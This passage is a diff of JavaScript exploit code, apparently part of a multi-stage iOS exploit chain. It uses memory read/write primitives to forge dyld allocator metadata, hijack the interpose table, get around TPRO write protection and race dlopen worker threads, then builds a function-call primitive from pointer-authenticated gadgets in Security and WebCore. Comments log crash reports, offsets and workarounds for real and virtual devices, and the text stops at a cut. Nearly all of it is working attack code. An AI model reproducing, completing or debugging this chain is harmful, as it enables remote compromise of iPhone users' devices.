+        const __nu = [Number(__cxa & 0xffn), Number((__cxa >> 8n) & 0xffn), Number((__cxa >> 16n) & 0xffn), Number((__cxa >> 24n) & 0xffn), Number((__cxa >> 32n) & 0xffn)];
+        let __parked = false, __pw = 0;
+        for (; __pw < 4000; __pw++) {
+            try { if (p.search_once(stack_top, stack_bottom, __nu) !== 0n) { __parked = true; break; } } catch (e) { }
+            if ((__pw & 0x1f) === 0) await spinYieldCool(__pw);   // ~10ms between probes
+        }
+        postMessage(`[stage5] worker1 park ${__parked ? `CONFIRMED (__cxa_atexit+0x28 on its stack, probe #${__pw})` : `NOT confirmed after ${__pw} probes -- proceeding anyway (fast-load case)`}`);
+    }
     const dyld_offset = offsets.dyld__RuntimeState_emptySlot - dyld_emptySlot - p.slide;
     postMessage(`[stage5] dyld_offset: ${hex(dyld_offset)}`);
     p.dlopen_from_lambda_ret = offsets.dyld__dlopen_from_lambda_ret - p.slide - dyld_offset;
@@ -1672,40 +2135,61 @@ async function stage5() {
     // free 0x180126a18, deallocate 0x180126b44, owner-walk 0x18011eda8, insert 0x180122938;
     // crashes 094420/094830/105411 ALL at insert+0x34 = 0x18012296c):
     //  - free's store: [RS+0xb8] = chunk - (metadata[1]&~3) + oldBuf + 0x10. With chunk =
-    //    attackerBuf+K and metadata[1] = (oldBuf+K+0x10)|3 the store lands attackerBuf EXACTLY
-    //    (K must stay 4-aligned so (metadata[1]&~3) == oldBuf+K+0x10).
+    //    attackerBuf+K and metadata[1] = (attackerBuf+K+0x10)|3 the store lands attackerBuf
+    //    EXACTLY when oldBuf == 0 (which we now FORCE by zeroing RS+0xb8 first -- every device).
     //  - deallocate needs metadata[1] BIT0 set (else fatal 0x1801a08e4), runs the owner-walk,
     //    then CLEARS the flag bits (and ~3 @ 0x180126b70) BEFORE tail-calling insert -- so |3's
     //    bit1 does NOT protect insert (the "no coalesce at all" theory was wrong).
     //  - owner-walk terminates on a link that is 0 or has bit0 set: prev_metadata self-link|1
     //    stops it AND keeps a valid owner (plain self-link livelocks; a 0 link -> null owner ->
     //    the 15:19-15:23 freeze / 094504). prev_metadata[1]=1 terminates insert's ldrb.
-    //  - insert+0x34 (the killer): x9 = metadata[1]&~3 = oldBuf+K+0x10; x9 = [x9+8] =
-    //    [oldBuf+K+0x18]; if that qword has BIT0 SET the merge-write is skipped; bit0 clear ->
-    //    str x0,[x9] -> null/wild write (far=0x0 in 094420/094830, far=0x3130414100000000 in
-    //    105411). 131246 survived because [oldBuf+0x218] happened to be ODD -- that was the luck.
-    //    Fix: SCAN oldBuf (readable; TPRO blocks writes, not reads) for a K with [oldBuf+K+0x18]
-    //    odd. No writes to oldBuf anywhere.
+    //  - insert+0x34 (the killer): x9 = metadata[1]&~3; x9 = [x9+8]; if that qword has BIT0 SET
+    //    the merge-write is skipped; bit0 clear -> str x0,[x9] -> null/wild write (far=0x0 in
+    //    094420/094830, far=0x3130414100000000 in 105411). The old fix SCANNED oldBuf's region for
+    //    an odd qword (layout luck + ellekit dependency + the stock oldBuf=0 null-deref, 232351);
+    //    the unified fix points x9 INTO our own tuples buffer with the odd qword PLANTED
+    //    (tuples[35]=1n) -- deterministic, TPRO-safe (no pool writes), no scan.
+    // Owner-walk termination (23B85): prev self-link WITH bit0 set (plain self-link livelocks).
     prev_metadata[0] = prev_metadata_data_ptr | 1n;
     prev_metadata[1] = 1n;
+    // NO DIRECT POOL WRITES (2026-07-22, proven by 143949/144102.ips): RS+0xb8/+0xc0 live INSIDE
+    // dyld's __TPRO_CONST pool -- any write64 to them faults KERN_PROTECTION_FAILURE on vphone AND
+    // stock (TPRO is enforced pool-wide; reads are fine). The zero-first metadata idea is dead.
+    // The store must be written BY DYLD (its apply self-RWs via os_thread_self_restrict_tpro_to_rw
+    // -- the legitimate per-thread toggle), and the metadata must be satisfiable with pool READS
+    // only:
+    //  - stock (oldBuf==0): metadata[1]=1 -> X = meta[1]&~3 = 0 -> insert+0x34 takes its cbz skip
+    //    (no deref at all); store = chunk - 0 + 0 + 0x10 = chunk, so chunk = attackerBuf-0x10 puts
+    //    the store at attackerBuf exactly (attackerBuf = tuples+0x10, metadata at tuples[0],[1]).
+    //  - vphone (oldBuf=ellekit): X = oldBuf+K+0x10 (cancels out of the store); insert's [X+8]
+    //    needs an odd qword in oldBuf's region -- found by the K SCAN (reads only, TPRO-legal).
     const oldBuf = p.read64(p_InterposeTupleAll_buffer);
-    const pageLeft = 0x4000n - (oldBuf & 0x3fffn) - 0x20n;
-    const kMax = pageLeft < 0x2700n ? pageLeft : 0x2700n;
-    let K = 0n;
-    for (let k = 0x100n; k < kMax; k += 8n) {
-        if ((p.read64(oldBuf + k + 0x18n) & 1n) === 1n) { K = k; break; }
+    const noTable = !(oldBuf > 0x100000000n && oldBuf < 0x210000000n);
+    let attackerBuf, interpose_base, metadata_addr, metadata1_size;
+    if (noTable) { //normal devices 
+        attackerBuf = interposingTuples_data_ptr + 0x10n;
+        interpose_base = 2;
+        metadata_addr = interposingTuples_data_ptr;   // = attackerBuf - 0x10 (chunk = attackerBuf)
+        metadata1_size = 1n;                           // X = 0 -> insert cbz skip (no deref)
+        postMessage(`[stage5] oldBuf=0 -- STOCK metadata[1]=1 (insert cbz skip, no pool write); attackerBuf=+0x10`);
+    } else { //Vphone ellekit trick 
+        attackerBuf = interposingTuples_data_ptr;
+        interpose_base = 0;
+        const pageLeft = 0x4000n - (oldBuf & 0x3fffn) - 0x20n;
+        const kMax = pageLeft < 0x2700n ? pageLeft : 0x2700n;
+        let K = 0n;
+        for (let k = 0x100n; k < kMax; k += 8n) {
+            if ((p.read64(oldBuf + k + 0x18n) & 1n) === 1n) { K = k; break; }
+        }
+        if (K === 0n) { K = 0x200n; postMessage(`[stage5] WARN: no odd qword near oldBuf; fallback K=0x200 (131246 luck)`); }
+        metadata_addr = interposingTuples_data_ptr + K;
+        metadata1_size = (oldBuf + K + 0x10n) | 3n;
+        postMessage(`[stage5] oldBuf=${hex(oldBuf)} K=${hex(K)} metadata_addr=${hex(metadata_addr)} flagQword=${hex(p.read64(oldBuf + K + 0x18n))}`);
     }
-    if (K === 0n) { K = 0x200n; postMessage(`[stage5] WARN: no odd qword near oldBuf; fallback K=0x200 (131246 luck)`); }
-    const metadata_addr = interposingTuples_data_ptr + K;
-    postMessage(`[stage5] oldBuf=${hex(oldBuf)} K=${hex(K)} metadata_addr=${hex(metadata_addr)} flagQword=${hex(p.read64(oldBuf + K + 0x18n))}`);
+    p.attackerBuf = attackerBuf;   // expose to wakeViaMapRedirect's re-park hold (spins RS+0xb8 for it)
     p.write64(metadata_addr + 0n, p.prev_metadata_data_ptr);          // chunk link -> prev_metadata (valid owner)
-    p.write64(metadata_addr + 8n, (oldBuf + K + 0x10n) | 3n);         // size field (bit0 = deallocate's gate)
+    p.write64(metadata_addr + 8n, metadata1_size);                    // size field (bit0 = deallocate's gate)
     const metadata_data_ptr = metadata_addr;                            // alias for the vecSlot writes below
-    p.metadata1 = metadata_addr;
-    // The forged vector must sit at lambda0's x19+0x70, NOT needle+0x78 (= x19+0x900): the
-    // epilogue's two resize(0) calls (0x180153bd0 / 0x180153bec, guarded on begin!=0) consume
-    // x19+0x70 / x19+0x90 ONLY. needle = saved lr at x19+0x888, so x19+0x70 = needle-0x818.
-    // (Proven by run 123404: worker1 woke+unlocked but no store -- the slot was never consumed.)
     const vecSlot = search_result - 0x818n;
     postMessage(`[stage5] vecSlot(x19+0x70)=${hex(vecSlot)}`);
     p.write64(vecSlot, p_InterposeTupleAll_buffer - 0x10n);        // lsl::Vector.allocator = dest-0x10
@@ -1714,98 +2198,46 @@ async function stage5() {
     p.write64(loader, p_InterposeTupleAll_buffer - 0x10n);
     p.write64(loader + 8n, metadata_data_ptr + 0x10n);
 
-    // --- drive the HOMEUI load on the MAIN worker to wake worker1 ---
-    p.write64(offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken, 0n);
+    //unlock for traditional loadobjcclass to laod 
     p.write64(p.TextToSpeech_NSBundle + structs.NSBundle_lock, 0n);
     p.write64(p.runtimeStateLock + structs.RuntimeStateLock_word, 0n);
-    const homeUIPath = p.makeCString("/System/Library/PrivateFrameworks/HomeUI.framework/HomeUI");
-    p.write64(offsets.CFNetwork__gConstantCFStringValueTable + structs.CFString_dataPtr, homeUIPath.ptr);
-    p.write64(offsets.CFNetwork__gConstantCFStringValueTable + structs.CFString_length, homeUIPath.len);
+    atexitSilent();   // drop-proof (count==gen): no unlock in the process can wake worker1 yet
     postMessage("Atexit mutex state: " + p.read64(hex(offsets.libsystem_c__atexit_mutex + structs.Atexit_mutexState)));
-// --- seedforge arm: poll learns chainTok, seeds count, forges worker1's token ---
-
-
-    postMessage(`[stage5] going to load AVSpeechSynthesisVoice`);
-  // --- silent load: worker1 sleeps through the whole load — no wake, no stale unlock ---
-atexitSilent();   // pass-through, no broadcast (held + waiter cleared, kernel flag kept)
-p.silentLoad = true;
-
-        // arm the bundle-lock handoff on worker2 BEFORE the wake-load — close() blocks this thread
-    await loadObjcClass(offsets.AVFAudio__OBJC_CLASS__AVSpeechSynthesisVoice);
-    postMessage(`[stage5] succeeded to load`);
-  p.silentLoad = false;
-
-    // === wake worker1 (UNFUSED): the load stays silent; the wake comes from a broadcast that
-    // does NOT hold TT._lock. dyld performs the REAL interpose write inside worker1's own
-    // dlopen_from epilogue off the hijacked loader -- the chain never writes +0xb8/+0xc0.
-    //   1) seed TT._lock with worker1's own token -> its pending stale unlock is legal WHENEVER it fires
-    //   2) arm the 0x100 waiter bit -> the next __cxa_atexit release anywhere in the process broadcasts
-    //   3) wait until dyld wrote the buffer AND worker1 cleared the lock (unlock proves it fully returned)
+    // === wake worker1
     const w1tok = BigInt(worker.threadPort);
     const lockAddr = p.TextToSpeech_NSBundle + structs.NSBundle_lock;
     p.write32le(lockAddr, w1tok);
-    atexitPass();   // arm the wake: held clear + waiter kept so the next __cxa_atexit release broadcasts
-    pumpSoftlink();          // chain-side synchronous softlink dlopens (this thread)
-    postMessage({ type: 'pump_start' });   // page-side window-only battery
+    // (mutex stays SILENT here -- the arm moves to the mapredir, after the w1tok seed)
     initWakeTargets();
     // baseline BEFORE any wake: run-260719_013148 showed buffer non-zero from the first sample
     // (0x200ca05e0, dyld persistent region) -- pre-existing interposing state; the metadata delta
     // compensates (see above) so the store must land EXACTLY interposingTuples_data_ptr.
-    postMessage(`[stage5] baseline: buffer=${hex(p.read64(p.p_InterposeTupleAll_buffer))} size=${hex(p.read64(p.p_InterposeTupleAll_size))} lock=${hex(p.read64(lockAddr) & 0xffffffffn)} atexit=${hex(p.read64(offsets.libsystem_c__atexit_mutex + structs.Atexit_mutexState))} want buffer=${hex(interposingTuples_data_ptr)}`);
-    let __buf = 0n, __w = w1tok, __spins = 0, __allSpentLogged = false;
-    while (true) {
-        __buf = p.read64(p.p_InterposeTupleAll_buffer);
-        __w = p.read64(lockAddr) & 0xffffffffn;
-        if (__buf === interposingTuples_data_ptr && __w !== w1tok) break;  // dyld wrote OUR buffer AND worker1 fully unlocked
-        if (++__spins % 250000 === 0) {
-            p.reestablishRead64();   // pump-driven dlopens clobber read64Str's backing (see read64 re-linker note) -- stale 0x9 reads / write64 recursion crash otherwise
-            // re-arm ONLY from 0: a blind re-arm can clobber a live 0x103 acquisition (another
-            // thread mid-__cxa_atexit, which the pump is deliberately provoking) -> atexit list
-            // corruption -> crash. The waiter bit is sticky (releases preserve it), so it needs no refresh.
-            const __as = p.read64(offsets.libsystem_c__atexit_mutex + structs.Atexit_mutexState);
-            if (__as === 0n) atexitPass();
-            // PRIMARY wake: NSMapTable redirect (clone-bundle load of a fresh framework, own lock).
-            // Fallback every 3M spins: the plant-target sequencer.
-            if (__spins === 250000) {
-                const __ok = await fireWorkerWake(W1_WAKE_PATH, w1tok);
-                // DEVICE-CLOBBER GUARD: a resident/bad wake path (fire produced no new image)
-                // means EVERY retry below just churns loads until the device dies (the
-                // CorePhotogrammetry 1547->1547 crash, 2026-07-21). Abort the attempt; the
-                // watchdog reloads a fresh one instead of hammering fallback loads.
-                if (!__ok) { postMessage(`[stage5] wake fire produced NO new image (${W1_WAKE_PATH} resident/bad) -- aborting attempt (device-clobber guard)`); postMessage({ type: 'pump_stop' }); return false; }
-            } else if (__spins % 3000000 === 0) {
-                const t = nextWakeTarget();
-                if (t) await fireWakeTarget(t, lockAddr, w1tok);
-                else {
-                    if (!__allSpentLogged) { __allSpentLogged = true; postMessage(`[stage5] ALL wake targets spent -- pump-only from here (lldb if this persists)`); }
-                    if (__spins % 3000000 === 0) pumpSoftlink();
-                }
-            }
-            if (__spins % 1000000 === 0) postMessage(`[stage5] wake-worker1 ${__spins}: buffer=${hex(__buf)} lock=${hex(__w)} atexit=${hex(__as)} (want buffer=${hex(interposingTuples_data_ptr)} lock!=${hex(w1tok)})`);
-            if (__spins >= 20000000) {
-                postMessage(`[stage5] WAKE TIMEOUT -- no broadcast reached worker1 (seed left in place; crash-safe, worker2 NOT triggered)`);
-                postMessage({ type: 'pump_stop' });
-                return false;
-            }
-        }
+    postMessage(`[stage5] baseline: buffer=${hex(p.read64(p.p_InterposeTupleAll_buffer))} size=${hex(p.read64(p.p_InterposeTupleAll_size))} lock=${hex(p.read64(lockAddr) & 0xffffffffn)} atexit=${hex(p.read64(offsets.libsystem_c__atexit_mutex + structs.Atexit_mutexState))} want buffer=${hex(attackerBuf)}`);
+    __buf = p.read64(p.p_InterposeTupleAll_buffer);
+    __w = p.read64(lockAddr) & 0xffffffffn;
+    p.reestablishRead64();
+    //const __as = p.read64(offsets.libsystem_c__atexit_mutex + structs.Atexit_mutexState);
+    const __ok = await fireWorkerWake(W1_WAKE_PATH, w1tok);
+    if (!__ok) {
+        postMessage(`[stage5] wake fire produced NO new image (${W1_WAKE_PATH} resident/bad) -- ABORTING attempt (a failed load poisons later loads; no chaining)`);
+        postMessage({ type: 'pump_stop' });
+        return false;
+    } else {
+
+        atexitWake();
+        p.write64(offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken, 0n);
+        p.write64(p.TextToSpeech_NSBundle + 0x40n, 0n);
+        p.write64(p.runtimeStateLock + 0x20n, 0n);
+        p.write64(offsets.CFNetwork__gConstantCFStringValueTable + 0x10n, offsets.HOMEUI_cstring);
+        p.write64(offsets.CFNetwork__gConstantCFStringValueTable + 0x18n, 0x3bn);
+        postMessage(`[stage5] going to load AVSpeechSynthesisVoice`);
+        // arm the bundle-lock handoff on worker2 BEFORE the wake-load — close() blocks this thread
+        await loadObjcClass(offsets.AVFAudio__OBJC_CLASS__AVSpeechSynthesisVoice);
+        postMessage(`[stage5] succeeded to load`);
     }
-    postMessage({ type: 'pump_stop' });
-    postMessage(`[stage5] worker1 interposed for real: buffer=${hex(__buf)} lock=${hex(__w)}`);
-    dumpWorkerStack(worker, 'worker1-post-interpose');   // where is worker1's dlopen parked now?
-
-    // §5i race RESOLVED by crash capture (fire3.ips, 2026-07-21): the fire-3 crasher is worker2's
-    // dispatch_once COMPLETION (thread 13: its close() handler -> _dispatch_gate_broadcast_slow)
-    // firing while the chain's fire-3 block still owns the gate (thread 10: dispatch_once_callout
-    // -> _AVLoadSpeechSynthesisImplementation). worker1's block NEVER completes (12s AND 60s
-    // waitGateQuiesce both timed out — it hangs in Bambi session XPC forever), so no serialize
-    // wait is needed or possible for worker1; the waitGateQuiesce call was REMOVED (pure cost).
-    // The real race is worker2's [wake -> completion] (~ms) vs the chain's [broadcast -> block
-    // return -> seed w2tok] (~90ms with TuriCore, 20:56 measurement). Fix: shrink the chain's
-    // window by waking worker2 with a 3-initializer framework (W2_WAKE_PATH), so the seed lands
-    // before worker2's completion.
-
     // --- re-arm to PARK worker2, redirect the bundle to PerfPower ---
     atexitHold();   // park worker2's __cxa_atexit with a registered waiter (was bare 0x03)
+    postMessage(`[stage5] Reparked`);
     p.write64(offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken, 0n);
     p.write64(p.TextToSpeech_NSBundle + structs.NSBundle_lock, 0n);
     p.write64(p.runtimeStateLock + structs.RuntimeStateLock_word, 0n);
@@ -1814,12 +2246,25 @@ p.silentLoad = true;
     const worker2Path = p.makeCString("/System/Library/PrivateFrameworks/PerfPowerServicesReader.framework/PerfPowerServicesReader");
     p.write64(offsets.CFNetwork__gConstantCFStringValueTable + structs.CFString_dataPtr, worker2Path.ptr);
     p.write64(offsets.CFNetwork__gConstantCFStringValueTable + structs.CFString_length, worker2Path.len);
+
+    postMessage("FINISHED STAGE 5!!!");
 }
 async function stage6() {
     const {
         offsets
     } = p;
     postMessage('check_dlopen2');
+    // COUNT-MATCH worker2 (2026-08-02): HomeUI's drop FIRES (gen flip) but worker2 never wakes --
+    // the mapredir arm reused worker1's stage4 parkWord (0x202), advertising the WRONG psynch
+    // generation for worker2's park. Capture worker2's ACTUAL park word now (worker2 is already
+    // parked from trigger_dlopen_worker2, and this is before any of stage6's own atexit ops) so
+    // the stage6 fire's count-matched arm matches worker2.
+    {
+        const __A2 = offsets.libsystem_c__atexit_mutex + structs.Atexit_mutexState;
+        const __old = p.parkWord;
+        p.parkWord = p.read64(__A2);
+        postMessage(`[stage6] worker2 parkWord=${hex(p.parkWord)} (worker1 was ${hex(__old)}); count-matched arm will use this`);
+    }
     const worker = p.dlopen_workers.find(w => (w.id & 0xffffffffn) === 0x22222222n);
     postMessage(`worker.thread: ${hex(worker.thread)}`);
     const stack_bottom = p.read64(worker.thread + 0x10n);
@@ -1904,7 +2349,14 @@ p.write64(p.TextToSpeech_NSBundle + structs.NSBundle_lock, 0n);     // wipe the 
 
     // verify the primitives are correct before we trust them downstream
     postMessage(`[stage6] loadObjcClass returned; building interpose tuples`);
-    let interpose_index = 0;
+    // Align the tuple writes with attackerBuf. On STOCK (noTable) devices the buffer-leg store
+    // lands attackerBuf = tuples+0x10 (the metadata header occupies tuples[0..1]), so dyld reads
+    // the interpose table from tuples[2]; writing the first tuple at tuples[0] leaves the MACaption
+    // pivot invisible -> the caption carrier's re-dlsym is NOT interposed -> IIOLoadCMPhotoSymbols
+    // never runs -> the gFunc globals stay 0 (the real-device fcall abort). vphone's ellekit path
+    // has attackerBuf = tuples[0], so this is 0 there.
+    const __tupleStart = Number((p.attackerBuf - p.interposingTuples.data()) / 8n);
+    let interpose_index = __tupleStart;
     function interpose(ptr, val) {
         p.interposingTuples[interpose_index++] = val;
         p.interposingTuples[interpose_index++] = ptr;
@@ -1965,7 +2417,11 @@ p.write64(p.TextToSpeech_NSBundle + structs.NSBundle_lock, 0n);     // wipe the 
     while (true) {
         __sz = p.read64(p.p_InterposeTupleAll_size);
         __w = p.read64(lockAddr) & 0xffffffffn;
-        if (__sz === wantSize && __w !== w2tok) break;                // dyld wrote +0x100 AND worker2 cleared the lock
+        // 2026-08-02: break on the SIZE store ALONE. worker2's epilogue DID write old+0x100
+        // (store landed), but its stale TT._lock unlock is tied to the dispatch_once gate block,
+        // which HANGS on vphone -> lock!=w2tok never becomes true and waiting on it spins forever.
+        // (Real device: worker2's gate completes ~0.13s after the store, so the lock clears there.)
+        if (__sz === wantSize) break;                                  // dyld wrote +0x100 (worker2's store landed)
         if (++__spins % 250000 === 0) {
             p.reestablishRead64();   // pump-driven dlopens clobber read64Str's backing
             const __as = p.read64(offsets.libsystem_c__atexit_mutex + structs.Atexit_mutexState);
@@ -1973,9 +2429,12 @@ p.write64(p.TextToSpeech_NSBundle + structs.NSBundle_lock, 0n);     // wipe the 
             // PRIMARY wake: NSMapTable redirect (clone-bundle load of a fresh framework, own lock).
             // Fallback every 3M spins: the plant-target sequencer (cursor continues from stage5).
             if (__spins === 250000) {
-                const __ok = await fireWorkerWake(W2_WAKE_PATH, w2tok);
-                // DEVICE-CLOBBER GUARD (same as stage5): resident/bad path -> abort, don't churn.
-                if (!__ok) { postMessage(`[stage6] wake fire produced NO new image (${W2_WAKE_PATH} resident/bad) -- aborting attempt (device-clobber guard)`); postMessage({ type: 'pump_stop' }); return; }
+                // worker2's wake: the stage5 EARLY-OUT guards (leftover store + flipped atexit gen)
+                // are worker1-stale here -> skip them; use spare[1] (0x44444444, fresh bitmap) and
+                // REUSE the known-good borrow (a rotated candidate, idx4, crashed the spare's gate).
+                // wantSize makes the mapredir store-sync wait for worker2's SIZE store (not worker1's
+                // leftover buffer) so the post-store freeze can't block worker2's re-acquire.
+                await fireWorkerWake(W2_WAKE_PATH, w2tok, { skipEarlyOut: true, spareIdx: 1, wantSize });
             } else if (__spins % 3000000 === 0) {
                 const t = nextWakeTarget();
                 if (t) await fireWakeTarget(t, lockAddr, w2tok);
@@ -1984,7 +2443,7 @@ p.write64(p.TextToSpeech_NSBundle + structs.NSBundle_lock, 0n);     // wipe the 
                     if (__spins % 3000000 === 0) pumpSoftlink();
                 }
             }
-            if (__spins % 1000000 === 0) postMessage(`[stage6] wake-worker2 ${__spins}: size=${hex(__sz)} buffer=${hex(p.read64(p.p_InterposeTupleAll_buffer))} lock=${hex(__w)} atexit=${hex(__as)} (want size=${hex(wantSize)}, lock!=${hex(w2tok)})`);
+            if (__spins % 1000000 === 0) postMessage(`[stage6] wake-worker2 ${__spins}: size=${hex(__sz)} buffer=${hex(p.read64(p.p_InterposeTupleAll_buffer))} lock=${hex(__w)} atexit=${hex(__as)} (want size=${hex(wantSize)}; lock=${hex(__w)} may never clear on vphone)`);
             if (__spins >= 20000000) {
                 postMessage(`[stage6] WAKE TIMEOUT -- no broadcast reached worker2 (seed left in place; crash-safe)`);
                 postMessage({ type: 'pump_stop' });
@@ -2039,105 +2498,51 @@ p.write64(p.TextToSpeech_NSBundle + structs.NSBundle_lock, 0n);     // wipe the 
     self.postMessage({
         type: 'sign_pointers'
     });
-}
-async function stage7() {
+}async function stage7() {
     const {
         offsets
     } = p;
-    const paciza_invoker = p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionCreateContainerFromImageExt);
-    postMessage(`paciza_invoker: ${hex(paciza_invoker)}`);
-    const paciza_security_invoker_1 = p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionCreateDataContainerFromImage);
-    postMessage(`paciza_security_invoker_1: ${hex(paciza_security_invoker_1)}`);
-    const paciza_security_invoker_2 = p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImage);
-    postMessage(`paciza_security_invoker_2: ${hex(paciza_security_invoker_2)}`);
-    const paciza_dlopen = p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImageFromDictionaryRepresentation);
-    postMessage(`paciza_dlopen: ${hex(paciza_dlopen)}`);
-    const paciza_dlsym = p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddCustomMetadata);
-    postMessage(`paciza_dlsym: ${hex(paciza_dlsym)}`);
-    const paciza_signPointer = p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddExif);
-    postMessage(`paciza_signPointer: ${hex(paciza_signPointer)}`);
-    const gSecurityd = new BigUint64Array(0x100 / 8);
-    const gSecurityd_data_ptr = gSecurityd.data();
-//NO CRASH HERE
-    // PRESERVE the real securityd ops table before swapping the global: a zeroed table makes
-    // Security.framework's next XPC to securityd dispatch to null and the caller hangs forever
-    // (the stage7-setup FREEZE right after paciza_signPointer, no .ips). Copy all 0x20 ops so
-    // Security/TLS/keychain keep working; slow_fcall only hijacks slots 0x78/0xb8 per call.
-    for (let i = 0n; i < 0x20n; i++) gSecurityd[i] = p.read64(offsets.Security__gSecurityd + i * 8n);
-    p.write64(offsets.Security__gSecurityd, gSecurityd_data_ptr);
-    const slowFcallResult = new BigUint64Array(0x10 / 8);
-    const slowFcallResult_data_ptr = slowFcallResult.data();
-    slowFcallResult[8 / 8] = slowFcallResult_data_ptr - 0x18n;
-    p.slowFcallResult = slowFcallResult;
-    const invoker_x0 = new BigUint64Array(0x58);
-    const invoker_x0_data_ptr = invoker_x0.data();
-    invoker_x0[0x20 / 8] = slowFcallResult_data_ptr;
-    // insurance: if any 26.1 detector path derefs [scanner+0x18] (the old FillInitialContext
-    // null-deref), a self-pointer keeps the reads in-bounds and benign.
-    invoker_x0[0x18 / 8] = invoker_x0_data_ptr;
-
-    // --- 26.1 FCALL TRIGGER (redesigned from the frozen-process diagnosis, §5o) ---
-    // 26.1's TelephoneNumberDetector::find makes ONE call: slot(scannerObj=[0x1eb083f78], span,
-    // len) via blraaz. So the fake scanner IS invoker_x0 and the SLOT is gadget1 (not the 18.6
-    // invoker epilogue — that gadget assumed a 0x70 caller frame; find() has a 0x50 frame and
-    // the call died at its autibsp). Flow: find() -> gadget1(x0=invoker_x0) -> reads x0..x2 from
-    // [invoker_x0+0x28/0x30/0x38] -> blraaz gSecurityd[0x80]=pc -> gadget1's own epilogue stores
-    // the result into slowFcallResult[0] and returns (result!=0) to find() cleanly. No frame
-    // contract, no epilogue gadget.
-    p.write8(offsets.WebCore__TND_supportedFlag, 1n);                          // skip find()'s zeroing path
-    p.write64(offsets.WebCore__TND_scannerOnce, 0xffffffffffffffffn);          // once-guard: ready
-    p.write64(offsets.WebCore__TND_scannerObject, invoker_x0_data_ptr);        // fake scanner = invoker_x0
-    function slow_fcall_1(pc, x0 = 0n, x1 = 0n, x2 = 0n) {
-        p.write64(offsets.WebCore__softLinkDDDFAScannerFirstResultInUnicharArray, paciza_security_invoker_1);
-        gSecurityd[0x80 / 8] = pc;   // 23B85: gadget 1 reads gSecurityd[0x80] (was 0x78 on 18.6)
-        invoker_x0[0x28 / 8] = x0;
-        invoker_x0[0x30 / 8] = x1;
-        invoker_x0[0x38 / 8] = x2;
-        // DIAG: is the gSecurityd swap still in effect AT CALL TIME? If the global reverted to the
-        // real table, the gadget reads a real op (or null) and falls back to a securityd XPC that
-        // never answers -> the main-thread HANG. Must be global==ours AND slot==pc for the fast path.
-        const __g = p.read64(offsets.Security__gSecurityd);
-        postMessage(`[fcall] pc=${hex(pc)} global=${hex(__g)} ours=${hex(gSecurityd_data_ptr)} ${__g === gSecurityd_data_ptr ? 'FAST' : 'XPC-FALLBACK!'}`);
-        return new Promise(r => {
-            slow_fcall_resolve = r;
-            self.postMessage({
-                type: 'slow_fcall'
-            });
-            // TIMEOUT: if slow_fcall_done never comes back, resolve with a sentinel so the self-test
-            // can distinguish "call never completed" (sentinel) from "completed with 0/garbage".
-            setTimeout(() => { if (slow_fcall_resolve === r) { slow_fcall_resolve = null; r(0xdeaddeadn); } }, 3000);
-        });
-    }
-    // SAFE NO CRASH
-    // 6-arg variant (gadget2 dispatches gSecurityd[0xc0]; args x0..x5).
-    function slow_fcall_2(pc, x0 = 0n, x1 = 0n, x2 = 0n, x3 = 0n, x4 = 0n, x5 = 0n) {
-        p.write64(offsets.WebCore__softLinkDDDFAScannerFirstResultInUnicharArray, paciza_security_invoker_2);
-        gSecurityd[0xc0 / 8] = pc;   // 23B85: gadget 2 reads gSecurityd[0xc0] (was 0xb8 on 18.6)
-        invoker_x0[0x28 / 8] = x0;
-        invoker_x0[0x30 / 8] = x1;
-        invoker_x0[0x38 / 8] = x2;
-        invoker_x0[0x40 / 8] = x3;
-        invoker_x0[0x48 / 8] = x4;
-        invoker_x0[0x50 / 8] = x5;
-        return new Promise(r => {
-            slow_fcall_resolve = r;
-            self.postMessage({
-                type: 'slow_fcall'
-            });
-        });
-    }
-    // dlopen/dlsym through the call primitive (makeCString for the name buffers -- no rope dance).
-    function slow_dlopen(filename, flags) {
-        const name = p.makeCString(filename);
-        postMessage("p.makestring: " + filename);
-        return slow_fcall_1(paciza_dlopen, name.ptr, flags);
-    }
-    function slow_dlsym(handle, symbol) {
-        const sym = p.makeCString(symbol);
-        return slow_fcall_1(paciza_dlsym, handle, sym.ptr);
-    }
-    p.slow_fcall_1 = slow_fcall_1; p.slow_fcall_2 = slow_fcall_2;
-    p.slow_dlopen = slow_dlopen; p.slow_dlsym = slow_dlsym;
+    // (2026-07-21 gate-free redesign) the ENTIRE fcall setup lives in setupFcall() (run in stage5's
+    // post-wake with per-call gSecurityd swap/restore). This stage is now JUST the self-test.
+    // Diag re-reads of the gadget globals (resolved by the stage5 caption carrier):
+    postMessage(`paciza_invoker: ${hex(p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionCreateContainerFromImageExt))}`);
+    postMessage(`paciza_security_invoker_1: ${hex(p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionCreateDataContainerFromImage))}`);
+    postMessage(`paciza_security_invoker_2: ${hex(p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImage))}`);
+    postMessage(`paciza_dlopen: ${hex(p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImageFromDictionaryRepresentation))}`);
+    postMessage(`paciza_dlsym: ${hex(p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddCustomMetadata))}`);
+    postMessage(`paciza_signPointer: ${hex(p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddExif))}`);
+    // fcall setup (2026-08-02): setupFcall() was defined but never CALLED in the gate-free flow --
+    // p.fcallReady / slow_dlopen / slow_dlsym only exist after it runs, and it needs the caption
+    // carrier to have resolved the gFunc globals (which stage6's sign_pointers just did). It returns
+    // false (and leaves fcallReady unset) if the invoker gadget didn't land -> abort below.
+    // PRE-SETUP LOG (2026-08-02): slide + the 6 gadget globals' raw and UNSLID (noPAC - slide)
+    // values right before setupFcall validates them -- pins the real device's slide and confirms
+    // which addresses the caption carrier actually resolved into the globals.
+    try {
+        p.reestablishRead64();
+        const __G = [
+            ['invoker', offsets.ImageIO__gFunc_CMPhotoCompressionCreateContainerFromImageExt],
+            ['sec1', offsets.ImageIO__gFunc_CMPhotoCompressionCreateDataContainerFromImage],
